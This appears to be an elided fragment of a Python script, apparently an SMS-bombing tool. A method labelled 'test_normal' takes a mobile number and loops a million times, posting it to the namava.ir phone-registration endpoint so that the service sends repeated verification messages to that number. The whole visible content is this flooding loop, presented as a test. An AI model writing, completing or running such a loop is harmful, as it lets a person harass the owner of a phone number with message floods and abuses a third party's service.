...
class Divar:
    ...
    def test_normal(mobile_number):
        ...
        for i in range(1000000):
            ...
            response = post("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", json=payload)
            info = response.json()
...
""")
        ...
        post("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",json={"phone":mobile_number})
